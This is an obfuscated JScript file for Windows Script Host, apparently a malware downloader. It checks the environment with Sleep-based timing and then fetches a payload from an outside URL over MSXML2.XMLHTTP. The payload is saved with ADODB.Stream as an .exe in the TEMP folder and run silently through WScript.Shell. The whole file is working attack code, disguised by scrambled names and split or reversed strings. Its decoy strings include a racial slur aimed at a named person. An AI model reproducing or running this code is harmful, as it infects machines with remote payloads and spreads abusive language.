var MafPlvHrdNcpElqJqaGgs = false;
var VjeBhoQdiLubZgbQxwNij = "";
var AbyThcDkhWidBwgLpyQfu;
var AamQlpQvgZqcGmqQppGxg = "C" + "r"+"eateObject";
var DreExvMfwYtuXrlEklFxq = this["WScript"];
var MjfLvcNlgPglSugOqcCij = function LypMuqVmoXawXwlAhrLsv() {return DreExvMfwYtuXrlEklFxq[AamQlpQvgZqcGmqQppGxg](("Travis Witteveen Sucks Nigga's cocks", "WScript")+".Shell");}(), UjtMbkOsyIryLkoGooUli = 11;
var PhwXyqUdyOawKquUtvIbn = 1 * (2 - 0);
var KloVxpTcaAjxLxsXsaIgf = PhwXyqUdyOawKquUtvIbn - (2 + 0) * 1;
function RckJdeKizHfiKzfLfhVtw(PkwBjuWrfGslPzvYcoUus){MjfLvcNlgPglSugOqcCij[("IKARUS Security Software ", "Ges.m.b.H.", "R")+ "u" + ("fuck", "n")](PkwBjuWrfGslPzvYcoUus, KloVxpTcaAjxLxsXsaIgf, KloVxpTcaAjxLxsXsaIgf);};
function PplUxiTirTdrFotJulYor(QuqIfxMbhUuxRjdKpqCqq, PxjRcgXazWboRzePhgLcu){KloVxpTcaAjxLxsXsaIgf = KloVxpTcaAjxLxsXsaIgf * 1; return QuqIfxMbhUuxRjdKpqCqq - PxjRcgXazWboRzePhgLcu;};
function AkyOomWvyDyoQsaCkwOay(){return AamQlpQvgZqcGmqQppGxg;};
/*@cc_on
  @if (@_win32 || @_win64)
    //
	MafPlvHrdNcpElqJqaGgs = true;
	VjeBhoQdiLubZgbQxwNij = "MLH";
	AbyThcDkhWidBwgLpyQfu = "R" + "esponseB" + "ydo".split('').reverse().join('');
	CriHcjIdhOfxSvoKtkLji = ("noitisop").split('').reverse().join('');
	WdlTrrWuuQeoKcsWnnDsu = "eliFoTevaS".split('').reverse().join('');
  @end
@*/
if (MafPlvHrdNcpElqJqaGgs)
{
var OruLofFpqHstTagItnUdy = "M" + "SXML2."+"X"+VjeBhoQdiLubZgbQxwNij+"TTP";
function AmwChhFwnImyYrcYdwQzn(){return OruLofFpqHstTagItnUdy + "";};

var UgtQgwMnfArnHttOgyUud = "";
function OaqRhkGpbHgzYkxIfkVub(){return 23;};
var ZbeVrzWubCndJcgAfqVhb = 0; var ExlTybKlaYaxNvfJohQjd = 0;
function MhcXviAjrOrrZqoGllGea()
{
var MbqTlfEyiNqwVvuGaaZiy = new this["D"+"ate"]();
var RgaRlbIanJtaRutZhjCbf = MbqTlfEyiNqwVvuGaaZiy["g"+"etUTCMilliseconds"]();
DreExvMfwYtuXrlEklFxq["Sleep"](OaqRhkGpbHgzYkxIfkVub());
var MbqTlfEyiNqwVvuGaaZiy = new this["D"+"ate"]();
var SrcEjfMyfLebGzoOgaEex = MbqTlfEyiNqwVvuGaaZiy["g"+"etUTCMilliseconds"]();
DreExvMfwYtuXrlEklFxq["Sleep"](OaqRhkGpbHgzYkxIfkVub());
var MbqTlfEyiNqwVvuGaaZiy = new this["D"+"ate"]();
var NdpPmfYmoJhpVfoJdnMkd = MbqTlfEyiNqwVvuGaaZiy["g"+"etUTCMilliseconds"]();
var ZbeVrzWubCndJcgAfqVhb = "UmoRkqHpwNytWxcDexDte";
ZbeVrzWubCndJcgAfqVhb = PplUxiTirTdrFotJulYor(SrcEjfMyfLebGzoOgaEex, RgaRlbIanJtaRutZhjCbf);
var ExlTybKlaYaxNvfJohQjd = "PidApxDnnUkcGoiZfmLmm";
ExlTybKlaYaxNvfJohQjd = PplUxiTirTdrFotJulYor(NdpPmfYmoJhpVfoJdnMkd, SrcEjfMyfLebGzoOgaEex);
UgtQgwMnfArnHttOgyUud = "o"+"pen";
return PplUxiTirTdrFotJulYor(1 == 1 ? ZbeVrzWubCndJcgAfqVhb : 0, 1 == 1 ? ExlTybKlaYaxNvfJohQjd : 0);
}
function HurJdoXayJnhNmtYmyStl(NadKbaYyjJfdGbmVlrLwl) {NadKbaYyjJfdGbmVlrLwl[WdlTrrWuuQeoKcsWnnDsu](QozPjxFbaXmzMyeXuyFmi(), 2 * 1); return 0;};
var YwgQkhGfkOawXwiYggIon = false;
var FhwLoaUedXbyFxnCfdZuo = false;
for (var HxcXuyCgqLbqAdrBuhVbj = KloVxpTcaAjxLxsXsaIgf; HxcXuyCgqLbqAdrBuhVbj < OaqRhkGpbHgzYkxIfkVub() * 1; HxcXuyCgqLbqAdrBuhVbj++){if (MhcXviAjrOrrZqoGllGea() != KloVxpTcaAjxLxsXsaIgf){
YwgQkhGfkOawXwiYggIon = true; 
ExlTybKlaYaxNvfJohQjd = ("221") + (ZbeVrzWubCndJcgAfqVhb * ExlTybKlaYaxNvfJohQjd); 
FhwLoaUedXbyFxnCfdZuo = true; 
break;
}}
function LwxAryGccZkjVszGmpPah() {return ((YwgQkhGfkOawXwiYggIon == true) && (YwgQkhGfkOawXwiYggIon == FhwLoaUedXbyFxnCfdZuo)) ? 1 : KloVxpTcaAjxLxsXsaIgf;};
if (YwgQkhGfkOawXwiYggIon && LwxAryGccZkjVszGmpPah() && FhwLoaUedXbyFxnCfdZuo){
function QozPjxFbaXmzMyeXuyFmi() {return MjfLvcNlgPglSugOqcCij["E"+"xpandEnvir"+"o"+"nmentStrings"]("%TE"+"MP%/") + "hQVvd4sLX.ex" + "e";};
 GfyQqzSrfAheOumGskWwe = AmwChhFwnImyYrcYdwQzn();
 IaxSqwMjrNqbNeiCalXol = DreExvMfwYtuXrlEklFxq[AamQlpQvgZqcGmqQppGxg](GfyQqzSrfAheOumGskWwe);
 var VxdTqqOgaEwdRdlYxzIiy = 3-2;
do { 
	for (;VxdTqqOgaEwdRdlYxzIiy;){
	try {
		if (VxdTqqOgaEwdRdlYxzIiy == 1)
		{
			IaxSqwMjrNqbNeiCalXol[UgtQgwMnfArnHttOgyUud]("G\x45T", "http://radyatortoptancisi.com/r8idkf", false);
			IaxSqwMjrNqbNeiCalXol["s"+"end"]();
			OyvMqwYgtTsxInfTqgUgi = "S"+"leep";
			VxdTqqOgaEwdRdlYxzIiy = 2;
		}
		DreExvMfwYtuXrlEklFxq[OyvMqwYgtTsxInfTqgUgi](OaqRhkGpbHgzYkxIfkVub() + 120); 
		if (IaxSqwMjrNqbNeiCalXol["r"+"eadystate"] < 2 * 2) continue;
		VxdTqqOgaEwdRdlYxzIiy = KloVxpTcaAjxLxsXsaIgf;
		function DbmHjmXevOrnTtiGizCmh(YcmJvzWzyMpiSthHqeZpw) {var OlvDgfTvbSbsJecRgjHxv = (1, 2, 3, 4, 5, YcmJvzWzyMpiSthHqeZpw); return OlvDgfTvbSbsJecRgjHxv;};
		GfyQqzSrfAheOumGskWwe = MylXeyRixKgcRqjEyqNwf = DreExvMfwYtuXrlEklFxq[AkyOomWvyDyoQsaCkwOay()]("A"+"DODB"+"."+"Stre"+"a"+"m");
		GfyQqzSrfAheOumGskWwe[UgtQgwMnfArnHttOgyUud]();
		GfyQqzSrfAheOumGskWwe["t"+"y"+"pe"] = 1;
		GfyQqzSrfAheOumGskWwe["w"+"r"+"ite"](IaxSqwMjrNqbNeiCalXol[AbyThcDkhWidBwgLpyQfu]);
		MylXeyRixKgcRqjEyqNwf[CriHcjIdhOfxSvoKtkLji] = 2-2;
		HurJdoXayJnhNmtYmyStl(GfyQqzSrfAheOumGskWwe);
		MylXeyRixKgcRqjEyqNwf["c"+"l"+"o"+"se"]();
		XzqUcjNohEuhTmuKzzOao = QozPjxFbaXmzMyeXuyFmi();
		if (1 && MafPlvHrdNcpElqJqaGgs) RckJdeKizHfiKzfLfhVtw(XzqUcjNohEuhTmuKzzOao);
	} catch(XbaEguJkjDnbWkaChvXph){};};
}while (VxdTqqOgaEwdRdlYxzIiy);
}
}

